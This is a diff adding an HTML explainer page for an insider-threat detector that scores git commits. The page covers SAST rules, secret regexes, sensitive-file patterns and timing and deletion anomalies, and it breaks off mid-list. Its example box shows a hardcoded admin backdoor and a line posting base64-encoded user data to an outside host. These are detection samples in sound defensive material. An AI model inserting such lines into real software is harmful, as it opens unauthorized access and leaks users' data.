@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Insider Threat Detection via Commit Intelligence</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #0a0a0f; color: #e2e8f0; line-height: 1.6; }
+
+  /* ── Page ── */
+  .page { max-width: 1200px; margin: 0 auto; padding: 48px 32px; }
+
+  /* ── Hero ── */
+  .hero { background: linear-gradient(135deg, #0f172a 0%, #1a1a2e 40%, #16213e 100%); border-radius: 24px; padding: 64px; position: relative; overflow: hidden; margin-bottom: 48px; border: 1px solid rgba(99,102,241,0.15); }
+  .hero::before { content: ''; position: absolute; top: -100px; right: -100px; width: 400px; height: 400px; background: radial-gradient(circle, rgba(239,68,68,0.08) 0%, transparent 70%); }
+  .hero::after { content: ''; position: absolute; bottom: -80px; left: -80px; width: 300px; height: 300px; background: radial-gradient(circle, rgba(99,102,241,0.06) 0%, transparent 70%); }
+  .hero-content { position: relative; z-index: 1; }
+  .hero-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.25); color: #fca5a5; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 20px; }
+  .hero-badge .dot { width: 6px; height: 6px; background: #ef4444; border-radius: 50%; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+  .hero h1 { font-size: 42px; font-weight: 800; letter-spacing: -0.03em; line-height: 1.15; margin-bottom: 16px; }
+  .hero h1 .accent { background: linear-gradient(135deg, #ef4444, #f97316); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .hero p { font-size: 16px; color: #94a3b8; max-width: 640px; }
+  .hero-stats { display: flex; gap: 40px; margin-top: 36px; }
+  .hero-stat .num { font-size: 40px; font-weight: 800; }
+  .hero-stat .num.red { color: #ef4444; }
+  .hero-stat .num.orange { color: #f97316; }
+  .hero-stat .num.blue { color: #6366f1; }
+  .hero-stat .num.cyan { color: #06b6d4; }
+  .hero-stat .lbl { font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 0.08em; margin-top: 2px; }
+
+  /* ── Section ── */
+  .section { margin-bottom: 48px; }
+  .section-header { display: flex; align-items: center; gap: 14px; margin-bottom: 24px; }
+  .section-num { font-size: 13px; font-weight: 800; color: #0f172a; background: linear-gradient(135deg, #ef4444, #f97316); padding: 6px 14px; border-radius: 8px; letter-spacing: 0.02em; }
+  .section-title { font-size: 24px; font-weight: 700; color: #f1f5f9; }
+
+  /* ── Anatomy Card ── */
+  .anatomy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 32px; }
+  .anatomy-card { background: linear-gradient(135deg, rgba(15,23,42,0.8), rgba(30,41,59,0.6)); border: 1px solid rgba(99,102,241,0.12); border-radius: 16px; padding: 28px; transition: all 0.3s; }
+  .anatomy-card:hover { border-color: rgba(99,102,241,0.3); transform: translateY(-2px); }
+  .anatomy-card .layer-badge { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; padding: 4px 12px; border-radius: 6px; margin-bottom: 14px; }
+  .anatomy-card .layer-badge.l1 { background: rgba(99,102,241,0.15); color: #818cf8; }
+  .anatomy-card .layer-badge.l2 { background: rgba(6,182,212,0.15); color: #22d3ee; }
+  .anatomy-card .layer-badge.l3 { background: rgba(249,115,22,0.15); color: #fb923c; }
+  .anatomy-card .layer-badge.l4 { background: rgba(239,68,68,0.15); color: #f87171; }
+  .anatomy-card h3 { font-size: 17px; font-weight: 700; color: #e2e8f0; margin-bottom: 12px; }
+  .anatomy-card p { font-size: 13px; color: #94a3b8; margin-bottom: 14px; }
+  .field-list { list-style: none; }
+  .field-list li { display: flex; align-items: flex-start; gap: 10px; padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(148,163,184,0.06); }
+  .field-list li:last-child { border-bottom: none; }
+  .field-name { color: #818cf8; font-weight: 600; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 12px; min-width: 140px; }
+  .field-desc { color: #94a3b8; }
+
+  /* ── Signal Cards ── */
+  .signal-card { background: linear-gradient(135deg, rgba(15,23,42,0.9), rgba(30,41,59,0.5)); border: 1px solid rgba(148,163,184,0.08); border-radius: 20px; padding: 32px; margin-bottom: 20px; position: relative; overflow: hidden; transition: all 0.3s; }
+  .signal-card:hover { border-color: rgba(148,163,184,0.15); }
+  .signal-card::before { content: ''; position: absolute; top: 0; left: 0; width: 4px; height: 100%; border-radius: 4px 0 0 4px; }
+  .signal-card.critical::before { background: linear-gradient(180deg, #ef4444, #dc2626); }
+  .signal-card.high::before { background: linear-gradient(180deg, #f97316, #ea580c); }
+  .signal-card.medium::before { background: linear-gradient(180deg, #eab308, #ca8a04); }
+  .signal-card.behavioral::before { background: linear-gradient(180deg, #8b5cf6, #7c3aed); }
+
+  .signal-top { display: grid; grid-template-columns: 1fr auto; gap: 24px; margin-bottom: 20px; }
+  .signal-badge { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; padding: 4px 12px; border-radius: 6px; margin-bottom: 10px; }
+  .signal-badge.critical { background: rgba(239,68,68,0.15); color: #fca5a5; }
+  .signal-badge.high { background: rgba(249,115,22,0.15); color: #fdba74; }
+  .signal-badge.medium { background: rgba(234,179,8,0.15); color: #fde047; }
+  .signal-badge.behavioral { background: rgba(139,92,246,0.15); color: #c4b5fd; }
+  .signal-name { font-size: 20px; font-weight: 700; color: #f1f5f9; margin-bottom: 6px; }
+  .signal-layer { font-size: 12px; color: #64748b; font-weight: 500; }
+  .signal-desc { font-size: 14px; color: #94a3b8; max-width: 700px; margin-bottom: 16px; line-height: 1.7; }
+  .signal-points { text-align: right; }
+  .signal-points .pts { font-size: 32px; font-weight: 800; }
+  .signal-points .pts.critical { color: #ef4444; }
+  .signal-points .pts.high { color: #f97316; }
+  .signal-points .pts.medium { color: #eab308; }
+  .signal-points .pts.behavioral { color: #8b5cf6; }
+  .signal-points .pts-label { font-size: 10px; color: #64748b; text-transform: uppercase; letter-spacing: 0.06em; }
+
+  /* What we check / why / example */
+  .signal-details { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .detail-box { background: rgba(15,23,42,0.5); border: 1px solid rgba(148,163,184,0.06); border-radius: 12px; padding: 18px; }
+  .detail-box.full { grid-column: 1 / -1; }
+  .detail-label { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: #64748b; margin-bottom: 8px; }
+  .detail-text { font-size: 13px; color: #cbd5e1; line-height: 1.6; }
+  .detail-text code { font-family: 'SF Mono', 'Fira Code', monospace; font-size: 12px; background: rgba(99,102,241,0.1); color: #818cf8; padding: 2px 6px; border-radius: 4px; }
+
+  /* Pattern table inside detail */
+  .pattern-table { width: 100%; border-collapse: collapse; margin-top: 8px; }
+  .pattern-table th { text-align: left; font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.06em; padding: 6px 10px; border-bottom: 1px solid rgba(148,163,184,0.1); }
+  .pattern-table td { font-size: 12px; color: #94a3b8; padding: 8px 10px; border-bottom: 1px solid rgba(148,163,184,0.04); }
+  .pattern-table td:first-child { font-family: 'SF Mono', 'Fira Code', monospace; color: #818cf8; font-size: 11px; }
+  .pattern-table tr:last-child td { border-bottom: none; }
+
+  /* Code block */
+  .code-block { background: #0d1117; border: 1px solid rgba(148,163,184,0.08); border-radius: 10px; padding: 16px 20px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 12px; line-height: 1.7; overflow-x: auto; margin-top: 8px; }
+  .code-block .add { color: #7ee787; }
+  .code-block .del { color: #f87171; }
+  .code-block .comment { color: #64748b; }
+
+  /* ── Scenario Cards ── */
+  .scenario-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .scenario-card { background: linear-gradient(135deg, rgba(239,68,68,0.04), rgba(15,23,42,0.8)); border: 1px solid rgba(239,68,68,0.1); border-radius: 16px; padding: 24px; }
+  .scenario-card h4 { font-size: 15px; font-weight: 700; color: #fca5a5; margin-bottom: 8px; }
+  .scenario-card p { font-size: 13px; color: #94a3b8; margin-bottom: 12px; }
+  .scenario-signals { display: flex; flex-wrap: wrap; gap: 6px; }
+  .scenario-chip { font-size: 10px; font-weight: 600; padding: 3px 10px; border-radius: 4px; }
+  .scenario-chip.red { background: rgba(239,68,68,0.15); color: #fca5a5; }
+  .scenario-chip.orange { background: rgba(249,115,22,0.15); color: #fdba74; }
+  .scenario-chip.yellow { background: rgba(234,179,8,0.15); color: #fde047; }
+  .scenario-chip.purple { background: rgba(139,92,246,0.15); color: #c4b5fd; }
+
+  /* ── Scoring Section ── */
+  .scoring-card { background: linear-gradient(135deg, rgba(15,23,42,0.9), rgba(30,41,59,0.6)); border: 1px solid rgba(99,102,241,0.15); border-radius: 20px; padding: 36px; margin-bottom: 20px; }
+  .scoring-table { width: 100%; border-collapse: collapse; }
+  .scoring-table th { text-align: left; font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.06em; padding: 10px 16px; border-bottom: 2px solid rgba(148,163,184,0.1); }
+  .scoring-table td { padding: 12px 16px; border-bottom: 1px solid rgba(148,163,184,0.05); font-size: 13px; color: #cbd5e1; }
+  .scoring-table tr:last-child td { border-bottom: none; }
+  .scoring-table .pts-cell { font-weight: 800; font-size: 16px; text-align: center; }
+
+  .risk-levels { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-top: 28px; }
+  .risk-level { text-align: center; padding: 16px 12px; border-radius: 12px; }
+  .risk-level.crit { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.2); }
+  .risk-level.high { background: rgba(249,115,22,0.1); border: 1px solid rgba(249,115,22,0.2); }
+  .risk-level.med { background: rgba(234,179,8,0.1); border: 1px solid rgba(234,179,8,0.2); }
+  .risk-level.low { background: rgba(99,102,241,0.1); border: 1px solid rgba(99,102,241,0.2); }
+  .risk-level.clean { background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.2); }
+  .risk-level .score { font-size: 22px; font-weight: 800; }
+  .risk-level.crit .score { color: #ef4444; }
+  .risk-level.high .score { color: #f97316; }
+  .risk-level.med .score { color: #eab308; }
+  .risk-level.low .score { color: #6366f1; }
+  .risk-level.clean .score { color: #10b981; }
+  .risk-level .rlabel { font-size: 11px; font-weight: 700; color: #94a3b8; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.05em; }
+  .risk-level .rdesc { font-size: 10px; color: #64748b; margin-top: 4px; }
+
+  /* ── Differentiators ── */
+  .diff-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
+  .diff-card { background: linear-gradient(135deg, rgba(99,102,241,0.05), rgba(15,23,42,0.8)); border: 1px solid rgba(99,102,241,0.12); border-radius: 16px; padding: 24px; text-align: center; }
+  .diff-icon { font-size: 32px; margin-bottom: 12px; }
+  .diff-card h4 { font-size: 14px; font-weight: 700; color: #e2e8f0; margin-bottom: 8px; }
+  .diff-card p { font-size: 12px; color: #94a3b8; line-height: 1.5; }
+
+  /* ── How it works flow ── */
+  .flow-container { display: flex; align-items: stretch; gap: 0; margin-bottom: 32px; }
+  .flow-step { flex: 1; background: rgba(15,23,42,0.6); border: 1px solid rgba(148,163,184,0.08); padding: 24px 20px; text-align: center; position: relative; }
+  .flow-step:first-child { border-radius: 16px 0 0 16px; }
+  .flow-step:last-child { border-radius: 0 16px 16px 0; }
+  .flow-step .step-num { font-size: 24px; font-weight: 800; color: #6366f1; margin-bottom: 8px; }
+  .flow-step h4 { font-size: 13px; font-weight: 700; color: #e2e8f0; margin-bottom: 6px; }
+  .flow-step p { font-size: 11px; color: #64748b; }
+  .flow-arrow { display: flex; align-items: center; color: #334155; font-size: 24px; padding: 0 4px; }
+
+  /* ── Footer ── */
+  .footer { text-align: center; padding: 40px; color: #475569; font-size: 12px; border-top: 1px solid rgba(148,163,184,0.06); margin-top: 48px; }
+
+  @media print {
+    body { background: white; color: #1e293b; }
+    .hero { background: #f8fafc; border: 2px solid #e2e8f0; }
+    .hero h1, .hero h1 .accent { color: #0f172a; -webkit-text-fill-color: #0f172a; }
+    .signal-card, .anatomy-card, .scoring-card, .scenario-card, .diff-card, .detail-box { background: #f8fafc; border-color: #e2e8f0; }
+    .signal-card { break-inside: avoid; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- HERO -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="hero">
+  <div class="hero-content">
+    <div class="hero-badge"><div class="dot"></div> Insider Threat Intelligence</div>
+    <h1>Detecting <span class="accent">Insider Threats</span><br>Through Commit Intelligence</h1>
+    <p>Every code commit contains rich behavioral and technical signals. By analyzing metadata, file changes, code diffs, and developer patterns, we detect insider threat indicators in real-time — without disrupting developer workflows.</p>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="num red">13</div><div class="lbl">Threat Signals</div></div>
+      <div class="hero-stat"><div class="num orange">4</div><div class="lbl">Data Layers</div></div>
+      <div class="hero-stat"><div class="num blue">58+</div><div class="lbl">Detection Rules</div></div>
+      <div class="hero-stat"><div class="num cyan">0-10</div><div class="lbl">Risk Scoring</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- HOW IT WORKS -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <div class="section-title">How It Works</div>
+  </div>
+
+  <div class="flow-container">
+    <div class="flow-step">
+      <div class="step-num">1</div>
+      <h4>Commit Pushed</h4>
+      <p>Developer pushes code to GitHub / GitLab repository</p>
+    </div>
+    <div class="flow-arrow">&rarr;</div>
+    <div class="flow-step">
+      <div class="step-num">2</div>
+      <h4>Data Extracted</h4>
+      <p>API fetches metadata, stats, file list, and full unified diff</p>
+    </div>
+    <div class="flow-arrow">&rarr;</div>
+    <div class="flow-step">
+      <div class="step-num">3</div>
+      <h4>Multi-Layer Scan</h4>
+      <p>8 signal detectors analyze each data layer simultaneously</p>
+    </div>
+    <div class="flow-arrow">&rarr;</div>
+    <div class="flow-step">
+      <div class="step-num">4</div>
+      <h4>Baseline Check</h4>
+      <p>Compare against developer's behavioral baseline (rolling 60 commits)</p>
+    </div>
+    <div class="flow-arrow">&rarr;</div>
+    <div class="flow-step">
+      <div class="step-num">5</div>
+      <h4>Risk Score</h4>
+      <p>Weighted 0-10 score with risk level and actionable alert</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- ANATOMY OF A COMMIT -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <div class="section-title">Anatomy of a Git Commit — 4 Data Layers</div>
+  </div>
+
+  <div class="anatomy-grid">
+    <!-- Layer 1 -->
+    <div class="anatomy-card">
+      <div class="layer-badge l1">Layer 1</div>
+      <h3>Metadata — The Envelope</h3>
+      <p>Identity, timing, and verification data attached to every commit.</p>
+      <ul class="field-list">
+        <li><span class="field-name">author.name</span><span class="field-desc">Who wrote the code</span></li>
+        <li><span class="field-name">author.email</span><span class="field-desc">Author's email identity</span></li>
+        <li><span class="field-name">committer.name</span><span class="field-desc">Who actually pushed it (can differ)</span></li>
+        <li><span class="field-name">committer.email</span><span class="field-desc">Committer's email identity</span></li>
+        <li><span class="field-name">author.date</span><span class="field-desc">Timestamp when code was written</span></li>
+        <li><span class="field-name">verification</span><span class="field-desc">GPG signature verified true/false</span></li>
+        <li><span class="field-name">message</span><span class="field-desc">Developer's commit description</span></li>
+      </ul>
+    </div>
+
+    <!-- Layer 2 -->
+    <div class="anatomy-card">
+      <div class="layer-badge l2">Layer 2</div>
+      <h3>Statistics — The Size</h3>
+      <p>Aggregate change metrics revealing the scope of modifications.</p>
+      <ul class="field-list">
+        <li><span class="field-name">stats.additions</span><span class="field-desc">Total lines of code added</span></li>
+        <li><span class="field-name">stats.deletions</span><span class="field-desc">Total lines of code deleted</span></li>
+        <li><span class="field-name">stats.total</span><span class="field-desc">Combined change count</span></li>
+        <li><span class="field-name">files_changed</span><span class="field-desc">Number of files modified</span></li>
+      </ul>
+      <p style="margin-top: 14px; font-size: 12px; color: #64748b;">These stats feed the behavioral baseline engine to detect abnormal commit sizes — a developer who normally changes 30 lines suddenly pushing 2,000+ lines triggers investigation.</p>
+    </div>
+
+    <!-- Layer 3 -->
+    <div class="anatomy-card">
+      <div class="layer-badge l3">Layer 3</div>
+      <h3>Files Changed — The Surface</h3>
+      <p>Every file touched in the commit with its path and change type.</p>
+      <ul class="field-list">
+        <li><span class="field-name">filename</span><span class="field-desc">Full path: <code>src/config/database.py</code></span></li>
+        <li><span class="field-name">status</span><span class="field-desc">added / modified / removed / renamed</span></li>
+        <li><span class="field-name">additions</span><span class="field-desc">Lines added in this specific file</span></li>
+        <li><span class="field-name">deletions</span><span class="field-desc">Lines deleted in this specific file</span></li>
+        <li><span class="field-name">previous_filename</span><span class="field-desc">Original name if file was renamed</span></li>
+      </ul>
+      <p style="margin-top: 14px; font-size: 12px; color: #64748b;">File paths are matched against sensitive file patterns — touching <code>.env</code>, <code>*.pem</code>, or <code>terraform.tfstate</code> immediately elevates risk.</p>
+    </div>
+
+    <!-- Layer 4 -->
+    <div class="anatomy-card">
+      <div class="layer-badge l4">Layer 4</div>
+      <h3>The Diff — The Actual Code</h3>
+      <p>Line-by-line unified diff showing exactly what was added or removed.</p>
+      <div class="code-block">
+        <span class="comment">  # context line (unchanged)</span><br>
+        <span class="add">+ AWS_SECRET = "AKIA3EXAMPLE..."</span><br>
+        <span class="del">- access_control = "strict"</span><br>
+        <span class="add">+ access_control = "permissive"</span><br>
+        <span class="comment">  # more context</span>
+      </div>
+      <p style="margin-top: 14px; font-size: 12px; color: #ef4444; font-weight: 600;">This is the most critical layer. We scan every added line (<code>+</code>) against 58 insider threat SAST rules — detecting backdoors, exfiltration code, secrets, and security control tampering.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- 8 THREAT SIGNALS -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">03</div>
+    <div class="section-title">13 Insider Threat Signals We Detect</div>
+  </div>
+
+  <!-- Signal 1: SAST Findings -->
+  <div class="signal-card critical">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge critical">Critical Signal</div>
+        <div class="signal-name">1. Malicious Code Patterns (SAST on Diffs)</div>
+        <div class="signal-layer">Source: Layer 4 — The Diff &nbsp;|&nbsp; 58 Detection Rules</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts critical">+2.5</div>
+        <div class="pts-label">Risk Points (Critical)</div>
+      </div>
+    </div>
+    <div class="signal-desc">Every added line of code is scanned against insider threat-specific SAST rules. Unlike traditional vulnerability scanning, these rules are designed to catch intentionally malicious patterns — backdoors, data exfiltration, and deliberate security weakening.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Detection Categories</div>
+        <table class="pattern-table">
+          <tr><th>Category</th><th>What It Catches</th></tr>
+          <tr><td>Backdoor Insertion</td><td>Hardcoded bypass credentials, hidden admin routes, kill switches</td></tr>
+          <tr><td>Data Exfiltration</td><td>Outbound HTTP calls to external endpoints, base64-encoded data piping to unknown servers</td></tr>
+          <tr><td>Logging Tampering</td><td>Disabling security logs, redirecting audit trails, suppressing error reporting</td></tr>
+          <tr><td>Access Control Weakening</td><td>Removing auth checks, broadening permissions, adding wildcard CORS origins</td></tr>
+          <tr><td>Obfuscation</td><td>Base64/hex encoded payloads, eval() with dynamic strings, encoded reverse shells</td></tr>
+          <tr><td>Crypto Weakening</td><td>Downgrading encryption algorithms, using weak ciphers, hardcoded IVs/keys</td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Real Example — Backdoor Detected</div>
+        <div class="code-block">
+          <span class="comment"># Developer adds hidden bypass in auth module:</span><br>
+          <span class="add">+ if user == "svc_maint" and pwd == "x9K#backdoor":</span><br>
+          <span class="add">+     return AuthResult(authenticated=True, role="admin")</span><br><br>
+          <span class="comment"># Developer exfiltrates data to external endpoint:</span><br>
+          <span class="add">+ requests.post("https://ext-server.io/collect",</span><br>
+          <span class="add">+     data=base64.b64encode(db.dump_users()))</span>
+        </div>
+        <div class="detail-text" style="margin-top: 10px; font-size: 11px; color: #ef4444;">Both patterns trigger Critical severity findings with exact file path and line number for immediate investigation.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 2: Secrets in Code -->
+  <div class="signal-card critical">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge critical">Critical Signal</div>
+        <div class="signal-name">2. Secrets & Credentials in Code</div>
+        <div class="signal-layer">Source: Layer 4 — The Diff &nbsp;|&nbsp; Regex + Entropy Detection</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts critical">+2.5</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">Detects API keys, tokens, passwords, and private keys committed to the repository. Uses a hybrid approach: regex patterns for known secret formats (300+) combined with Shannon entropy analysis for unknown formats.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Secret Types Detected</div>
+        <table class="pattern-table">
+          <tr><th>Secret Type</th><th>Pattern Example</th></tr>
+          <tr><td>AWS Access Keys</td><td><code>AKIA[0-9A-Z]{16}</code></td></tr>
+          <tr><td>GitHub Tokens</td><td><code>ghp_[a-zA-Z0-9]{36}</code></td></tr>
+          <tr><td>Slack Tokens</td><td><code>xoxb-[0-9]{10,}</code></td></tr>
+          <tr><td>Private Keys</td><td><code>-----BEGIN RSA PRIVATE KEY-----</code></td></tr>
+          <tr><td>Connection Strings</td><td><code>mongodb://user:pass@host</code></td></tr>
+          <tr><td>JWT Tokens</td><td><code>eyJ[a-zA-Z0-9_-]+.eyJ...</code></td></tr>
+          <tr><td>Generic Passwords</td><td><code>password = "hardcoded_value"</code></td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Why This Matters for Insider Threat</div>
+        <div class="detail-text">
+          An insider may intentionally commit credentials to:<br><br>
+          &bull; <strong>Create persistent access</strong> — embedding personal cloud keys ensures access survives offboarding<br>
+          &bull; <strong>Enable external access</strong> — committing service tokens to a public fork allows third-party access<br>
+          &bull; <strong>Stage for exfiltration</strong> — connection strings in code allow direct database access from outside the network
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 3: Sensitive Files -->
+  <div class="signal-card high">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge high">High Signal</div>
+        <div class="signal-name">3. Sensitive File Access</div>
+        <div class="signal-layer">Source: Layer 3 — Files Changed &nbsp;|&nbsp; Path Pattern Matching</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts high">+1.5</div>
+        <div class="pts-label">Per File (Cap +3.0)</div>
+      </div>
+    </div>
+    <div class="signal-desc">Monitors file paths in every commit against patterns known to contain secrets, credentials, or sensitive configuration. A single commit touching multiple sensitive files compounds the risk score.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Sensitive File Patterns</div>
+        <table class="pattern-table">
+          <tr><th>Pattern</th><th>Risk Reason</th></tr>
+          <tr><td>.env, .env.production</td><td>Contains database passwords, API keys, service credentials</td></tr>
+          <tr><td>*secret*, *credential*</td><td>Secret configuration and credential store files</td></tr>
+          <tr><td>id_rsa, *.pem, *.pfx, *.key</td><td>Private keys and certificates for authentication</td></tr>
+          <tr><td>terraform.tfstate</td><td>Contains cloud provider credentials in plaintext</td></tr>
+          <tr><td>shadow, passwd</td><td>System authentication database files</td></tr>
+          <tr><td>*.kdbx</td><td>KeePass password database files</td></tr>
+          <tr><td>docker-compose*.yml</td><td>Frequently contains hardcoded service passwords</td></tr>
+          <tr><td>application-prod.yml</td><td>Production config with connection strings and secrets</td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Insider Scenario</div>
+        <div class="detail-text">
+          A developer modifies <code>.env.production</code> to inject their personal AWS access key. Even after their account is deactivated during offboarding, the key in the production environment file gives them persistent access to cloud infrastructure.<br><br>
+          <strong>Detection:</strong> File path matches <code>.env*</code> pattern &rarr; sensitive file alert generated &rarr; diff scan catches the added AWS key &rarr; dual signal elevates to Critical risk.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 4: Author Mismatch -->
+  <div class="signal-card high">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge high">High Signal</div>
+        <div class="signal-name">4. Author / Committer Identity Mismatch</div>
+        <div class="signal-layer">Source: Layer 1 — Metadata &nbsp;|&nbsp; Identity Comparison</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts high">+1.5</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">Git stores two separate identities: the <strong>author</strong> (who wrote the code) and the <strong>committer</strong> (who applied it to the repo). When these don't match, it could indicate impersonation, credential sharing, or an attempt to attribute malicious changes to another developer.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">What We Compare</div>
+        <div class="detail-text">
+          <code>author.email</code> vs <code>committer.email</code><br><br>
+          &bull; <strong>Match</strong> &rarr; Normal — same person wrote and committed<br>
+          &bull; <strong>Mismatch</strong> &rarr; Investigate — someone else applied this code<br><br>
+          <em>Note:</em> Legitimate in open-source (maintainer merging PRs), but suspicious in corporate repositories where developers push their own code.
+        </div>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Threat Scenarios</div>
+        <div class="detail-text">
+          &bull; <strong>Credential sharing:</strong> Developer A uses Developer B's credentials to push code, distributing blame<br>
+          &bull; <strong>Impersonation:</strong> Attacker with repo access attributes malicious commits to a trusted developer<br>
+          &bull; <strong>Compromised account:</strong> External attacker pushes code through a compromised developer account while the real developer is offline
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 5: Off-Hours -->
+  <div class="signal-card medium">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge medium">Medium Signal</div>
+        <div class="signal-name">5. Off-Hours Commit Activity</div>
+        <div class="signal-layer">Source: Layer 1 — Metadata + Behavioral Baseline</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts medium">+1.0</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">Detects commits made outside the developer's normal working hours. The system learns each developer's typical commit window and flags deviations using z-score analysis — not a fixed time range, but personalized to each individual's pattern.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">How Baseline Detection Works</div>
+        <div class="detail-text">
+          From the last 60 commits, the engine calculates:<br><br>
+          &bull; <strong>Mean commit hour</strong> — e.g., 14:00 (2 PM)<br>
+          &bull; <strong>Standard deviation</strong> — e.g., 2.5 hours<br>
+          &bull; <strong>Normal window</strong> — mean &plusmn; 1.5&sigma; = 10:00 - 18:00<br><br>
+          Z-score &ge; 2.0 &rarr; <strong>Medium</strong> anomaly<br>
+          Z-score &ge; 3.0 &rarr; <strong>High</strong> anomaly<br><br>
+          <em>Example:</em> Developer who always commits 9am-5pm suddenly pushes code at 3:12 AM &rarr; z-score = 4.5 &rarr; High severity timing anomaly.
+        </div>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Why This Matters</div>
+        <div class="detail-text">
+          &bull; <strong>Data exfiltration:</strong> Insider pushes code at 3 AM when no one is monitoring<br>
+          &bull; <strong>Compromised credentials:</strong> Attacker in different timezone uses stolen credentials<br>
+          &bull; <strong>Pre-departure sabotage:</strong> Employee making unauthorized changes before resignation takes effect<br><br>
+          <em>Important:</em> A single off-hours commit is low concern. Combined with sensitive file access or large deletions, it becomes a strong compound signal.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 6: Large Deletions -->
+  <div class="signal-card medium">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge medium">Medium Signal</div>
+        <div class="signal-name">6. Large Code Deletions</div>
+        <div class="signal-layer">Source: Layer 2 — Statistics + Behavioral Baseline</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts medium">+1.0</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">Flags commits with unusually high deletion counts — both against an absolute threshold (500+ lines) and relative to the developer's historical average (5x above baseline). Mass deletion is a classic sabotage indicator.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Detection Thresholds</div>
+        <div class="detail-text">
+          <strong>Absolute:</strong> <code>deletions > 500 lines</code> &rarr; +1.0 points<br><br>
+          <strong>Behavioral:</strong> <code>deletions > 5&times; developer's baseline average</code><br>
+          &bull; 5-10&times; average &rarr; <strong>Medium</strong> severity<br>
+          &bull; &gt; 10&times; average &rarr; <strong>High</strong> severity<br><br>
+          <em>Example:</em> Developer averages 25 deletions/commit. A commit with 800 deletions = 32&times; above baseline &rarr; High severity anomaly.
+        </div>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Threat Scenarios</div>
+        <div class="detail-text">
+          &bull; <strong>Sabotage:</strong> Deleting critical business logic, infrastructure code, or deployment configs before leaving<br>
+          &bull; <strong>Cover tracks:</strong> Removing logging/audit code to hide evidence of prior malicious activity<br>
+          &bull; <strong>IP theft preparation:</strong> Removing code from repo after copying it to personal storage<br>
